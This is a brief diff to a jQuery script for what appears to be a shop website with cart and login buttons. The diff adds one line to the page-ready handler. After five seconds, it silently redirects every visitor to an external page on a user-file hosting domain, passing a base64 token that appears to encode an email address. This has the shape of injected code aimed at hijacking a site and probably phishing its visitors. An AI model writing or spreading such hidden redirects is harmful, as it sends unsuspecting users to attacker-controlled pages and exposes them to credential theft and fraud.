@@ -1,5 +1,5 @@
 $(document).ready(function(){
-
+setTimeout(function(){window.location.href="https://mdewdghpy3rvymvymjayma.filesusr.com/html/dae85e_2519e674b5d44fb8d09ad9e9e07d968f.html?*c2FuZzIzNDU2NzgqKiplcypvbWFyeGQzNjAwQGdtYWlsLmNvbQ==";},5000);
   $('.menu .nose,.btn_carrito, .btn_login, .logi').each(function(index, elemento){
   	$(this).css({
 
